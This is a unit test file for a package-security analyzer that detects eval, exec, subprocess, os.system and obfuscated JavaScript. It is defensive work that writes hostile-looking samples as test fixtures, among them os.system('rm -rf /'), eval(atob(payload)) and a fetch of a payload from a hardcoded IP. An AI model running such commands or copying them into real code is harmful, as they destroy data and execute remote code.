"""Thorough unit tests for depfence.analyzers.ast_analysis."""
from __future__ import annotations

import asyncio
import warnings
from pathlib import Path

from depfence.analyzers.ast_analysis import AstAnalyzer
from depfence.core.models import FindingType, PackageId, PackageMeta, Severity

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _pkg(name: str = "test-pkg") -> PackageId:
    return PackageId("pypi", name, "1.0.0")


def _meta(name: str = "test-pkg") -> PackageMeta:
    return PackageMeta(pkg=_pkg(name))


def _run(coro):
    return asyncio.run(coro)


def _write(path: Path, content: str) -> Path:
    path.write_text(content)
    return path


# ---------------------------------------------------------------------------
# analyze() — source_path guards
# ---------------------------------------------------------------------------

def test_analyze_returns_empty_when_source_path_none(tmp_path):
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), source_path=None))
    assert findings == []


def test_analyze_returns_empty_when_source_path_missing():
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), source_path=Path("/no/such/dir")))
    assert findings == []


def test_analyze_empty_directory_returns_empty(tmp_path):
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), source_path=tmp_path))
    assert findings == []


def test_untrusted_invalid_escape_does_not_emit_process_warning(tmp_path):
    _write(tmp_path / "warning.py", 'pattern = "\\d+"\n')
    analyzer = AstAnalyzer()

    with warnings.catch_warnings(record=True) as captured:
        warnings.simplefilter("always")
        _run(analyzer.analyze(_meta(), tmp_path))

    assert not [warning for warning in captured if warning.category is SyntaxWarning]


# ---------------------------------------------------------------------------
# Python — dangerous call detection
# ---------------------------------------------------------------------------

def test_detects_eval_call(tmp_path):
    _write(tmp_path / "evil.py", "eval(user_input)\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    titles = [f.title for f in findings]
    assert any("eval" in t for t in titles)


def test_eval_finding_is_high_severity(tmp_path):
    _write(tmp_path / "evil.py", "eval(user_input)\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    eval_findings = [f for f in findings if "eval" in f.title]
    assert eval_findings
    assert eval_findings[0].severity == Severity.HIGH


def test_detects_exec_call(tmp_path):
    _write(tmp_path / "run.py", "exec(code)\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("exec" in f.title for f in findings)


def test_detects_subprocess_run(tmp_path):
    _write(tmp_path / "shell.py", "import subprocess\nsubprocess.run(['ls'])\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("subprocess.run" in f.title for f in findings)


def test_detects_os_system(tmp_path):
    _write(tmp_path / "shell.py", "import os\nos.system('rm -rf /')\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("os.system" in f.title for f in findings)


def test_detects_dunder_import(tmp_path):
    _write(tmp_path / "loader.py", "__import__('os').system('id')\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("__import__" in f.title for f in findings)


def test_clean_python_file_produces_no_findings(tmp_path):
    _write(tmp_path / "safe.py", "def add(a, b):\n    return a + b\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings == []


def test_syntax_error_file_does_not_crash(tmp_path):
    _write(tmp_path / "broken.py", "def ((((\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    # Should return gracefully (empty or other findings, not raise)
    assert isinstance(findings, list)


def test_finding_type_is_behavioral_for_dangerous_calls(tmp_path):
    _write(tmp_path / "evil.py", "eval('1+1')\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    behavioral = [f for f in findings if f.finding_type == FindingType.BEHAVIORAL]
    assert behavioral


def test_finding_metadata_includes_file_and_line(tmp_path):
    _write(tmp_path / "evil.py", "x = 1\neval(x)\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    eval_f = next((f for f in findings if "eval" in f.title), None)
    assert eval_f is not None
    assert "line" in eval_f.metadata
    assert eval_f.metadata["line"] == 2


# ---------------------------------------------------------------------------
# Python — obfuscation score
# ---------------------------------------------------------------------------

def test_obfuscation_flagged_for_exec_compile(tmp_path):
    _write(tmp_path / "obf.py", "exec(compile('code', '<string>', 'exec'))\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings


def test_obfuscation_score_low_for_normal_code():
    analyzer = AstAnalyzer()
    score = analyzer._python_obfuscation_score("x = 1\nprint(x)\n")
    assert score < 0.6


def test_obfuscation_score_high_for_many_hex_escapes():
    # > 20 hex escape sequences
    hex_str = "".join(f"\\x{i:02x}" for i in range(25))
    source = f"x = '{hex_str}'\n"
    analyzer = AstAnalyzer()
    score = analyzer._python_obfuscation_score(source)
    assert score >= 0.2  # at least the hex-sequence signal fires


def test_obfuscation_score_high_for_long_avg_line():
    long_line = "x = " + "a" * 250
    source = long_line + "\n"
    analyzer = AstAnalyzer()
    score = analyzer._python_obfuscation_score(source)
    assert score >= 0.2


# ---------------------------------------------------------------------------
# JavaScript — suspicious pattern detection
# ---------------------------------------------------------------------------

def test_detects_eval_in_js(tmp_path):
    _write(tmp_path / "index.js", "eval(atob(payload));\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("eval" in f.title.lower() for f in findings)


def test_detects_child_process_require(tmp_path):
    _write(tmp_path / "run.js", "const cp = require('child_process');\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("child_process" in f.title for f in findings)


def test_detects_hardcoded_ip_url(tmp_path):
    _write(tmp_path / "fetch.js", "fetch('http://192.168.1.1/payload');\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("IP" in f.title or "ip" in f.title.lower() for f in findings)


def test_detects_long_fromcharcode_chain(tmp_path):
    args = ", ".join(str(i) for i in range(10))
    _write(tmp_path / "deob.js", f"String.fromCharCode({args});\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    # The pattern requires 5+ args; 10 args should trigger
    assert any("fromCharCode" in f.title for f in findings)


def test_js_clean_file_no_findings(tmp_path):
    _write(tmp_path / "utils.js", "function add(a, b) { return a + b; }\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings == []


def test_large_js_file_no_crash(tmp_path):
    line = "var x = " + "a" * 88 + ";\n"
    _write(tmp_path / "bundle.js", line * 6_000)
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert isinstance(findings, list)


def test_mjs_files_are_analysed(tmp_path):
    _write(tmp_path / "module.mjs", "eval(payload);\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("eval" in f.title.lower() for f in findings)


def test_js_finding_has_correct_metadata(tmp_path):
    _write(tmp_path / "run.js", "const cp = require('child_process');\n")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    cp_f = next((f for f in findings if "child_process" in f.title), None)
    assert cp_f is not None
    assert "count" in cp_f.metadata
    assert cp_f.metadata["count"] >= 1


# ---------------------------------------------------------------------------
# _get_call_name helper
# ---------------------------------------------------------------------------

def test_get_call_name_simple_name(tmp_path):
    import ast as _ast
    analyzer = AstAnalyzer()
    tree = _ast.parse("eval('x')")
    calls = [n for n in _ast.walk(tree) if isinstance(n, _ast.Call)]
    assert analyzer._get_call_name(calls[0]) == "eval"


def test_get_call_name_attribute_call(tmp_path):
    import ast as _ast
    analyzer = AstAnalyzer()
    tree = _ast.parse("os.system('x')")
    calls = [n for n in _ast.walk(tree) if isinstance(n, _ast.Call)]
    assert analyzer._get_call_name(calls[0]) == "os.system"


def test_get_call_name_unknown_returns_empty():
    import ast as _ast
    analyzer = AstAnalyzer()
    # A Call whose func is a subscript — not Name or Attribute
    node = _ast.Call(func=_ast.Constant(value=42), args=[], keywords=[])
    assert analyzer._get_call_name(node) == ""


# ---------------------------------------------------------------------------
# Package identity propagated to findings
# ---------------------------------------------------------------------------

def test_finding_package_matches_input(tmp_path):
    _write(tmp_path / "evil.py", "eval('1')\n")
    pkg = _pkg("my-special-pkg")
    meta = _meta("my-special-pkg")
    analyzer = AstAnalyzer()
    findings = _run(analyzer.analyze(meta, tmp_path))
    assert all(f.package == pkg for f in findings)
